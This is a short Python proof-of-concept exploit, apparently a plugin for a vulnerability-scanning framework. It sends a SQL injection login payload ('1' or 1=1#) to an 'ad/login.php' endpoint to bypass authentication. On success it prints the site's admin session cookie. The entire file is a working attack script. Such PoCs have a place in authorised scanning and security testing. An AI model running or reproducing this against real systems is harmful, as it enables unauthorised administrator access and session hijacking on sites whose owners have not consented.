import re

import requests

from lib.core.data import target


def poc():
    try:
        if not target.url.endswith("ad/login.php"):
            print("[*] Please make sure the url end with 'ad/login.php'")
            exit()
        payload = {"user": "1' or 1=1#", "psw": "1", "loginlong": "86400"}
        url = target.url + "?g=jsloginpost"
        r = requests.post(url, data=payload)
        p = re.compile("(?<=document.write\(1<br>)(.*)(?=<br>\);)")
        result = r.json()['jieguo']
        if "\u767b\u5f55\u6210\u529f\uff01\u6b63\u5728\u524d\u5f80".decode(
                'unicode_escape') in result:
            print("[*] Login Successful!")
            print("[*] Get the admin cookie: " + str(r.headers['Set-Cookie']))
        else:
            raise KeyError
    except (KeyError, AttributeError) as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
